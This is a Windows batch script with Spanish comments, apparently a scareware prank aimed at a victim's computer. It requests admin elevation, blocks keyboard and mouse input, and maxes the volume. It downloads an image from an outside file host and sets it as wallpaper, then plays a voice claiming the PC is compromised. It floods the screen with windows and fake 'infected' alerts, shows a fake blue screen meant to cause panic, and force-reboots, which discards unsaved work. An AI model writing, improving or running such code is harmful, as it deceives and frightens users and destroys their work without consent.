@echo off
title SYSTEM CRITICAL ERROR
setlocal enabledelayedexpansion

:: ---------------------------------------------------------
:: 1. ELEVACIÓN DE PRIVILEGIOS (Para bloquear teclado/ratón)
:: ---------------------------------------------------------
openfiles >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: ---------------------------------------------------------
:: 2. BLOQUEO TOTAL Y VOLUMEN AL MÁXIMO
:: ---------------------------------------------------------
echo Preparando sistema...
:: Bloquea teclado y ratón
rundll32.exe user32.dll,BlockInput 1

:: Sube el volumen a 100 con un bucle rápido de PowerShell
powershell -c "$w=New-Object -ComObject WScript.Shell;for($i=0;$i -lt 50;$i++){$w.SendKeys([char]175)}"

:: ---------------------------------------------------------
:: 3. FONDO CHAMOI Y VOZ DEL SISTEMA
:: ---------------------------------------------------------
:: Descargar y aplicar fondo
powershell -Command "Invoke-WebRequest -Uri 'https://files.catbox.moe/e9uh10.jpg' -OutFile '%temp%\c.jpg'"
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%temp%\c.jpg" /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d "10" /f
rundll32.exe user32.dll,UpdatePerUserSystemParameters 1, True

:: Voz de advertencia
echo Set s = CreateObject("SAPI.SpVoice") > %temp%\v.vbs
echo s.Speak "Critical error. Your computer has been compromised by Chamoi. Absolute chaos initiated." >> %temp%\v.vbs
start wscript %temp%\v.vbs

:: ---------------------------------------------------------
:: 4. BOMBARDEO DE VENTANAS (RICKROLL Y CAOS)
:: ---------------------------------------------------------
echo Lanzando ataque masivo...
for /L %%i in (1,1,15) do (
    start "" "https://youtu.be/f_WuRfuMXQw?autoplay=1"
    start calc
    start notepad
    echo msgbox "ERROR CRITICO EN SECTOR %%i", 16, "SISTEMA INFECTADO" > %temp%\m%%i.vbs
    start wscript %temp%\m%%i.vbs
)

:: ---------------------------------------------------------
:: 5. EL PANTALLAZO AZUL (BSOD FALSO)
:: ---------------------------------------------------------
:: Crea una ventana azul que tapa TODA la pantalla
echo Generando pantalla de la muerte...
start /min powershell -WindowStyle Hidden -Command "& {Add-Type -AssemblyName System.Windows.Forms; $f = New-Object System.Windows.Forms.Form; $f.BackColor = 'Blue'; $f.WindowState = 'Maximized'; $f.FormBorderStyle = 'None'; $f.TopMost = $true; $l = New-Object System.Windows.Forms.Label; $l.Text = ':(' + [char]10 + [char]10 + 'Your PC ran into a problem and needs to restart. We''re just collecting some error info, and then we''ll restart for you.'; $l.ForeColor = 'White'; $l.Font = New-Object System.Drawing.Font('Segoe UI', 25); $l.AutoSize = $true; $l.Top = 150; $l.Left = 100; $f.Controls.Add($l); $f.ShowDialog()}"

:: ---------------------------------------------------------
:: 6. CUENTA REGRESIVA Y REINICIO
:: ---------------------------------------------------------
:: Espera 8 segundos para que el usuario entre en pánico viendo el azul
timeout /t 8 /nobreak >nul

:: Desbloquea entrada justo antes del final (opcional, para dar falsas esperanzas)
rundll32.exe user32.dll,BlockInput 0

:: Limpieza rápida de archivos VBS creados
del %temp%\*.vbs

:: Reinicio forzoso instantáneo
shutdown /r /t 0 /f
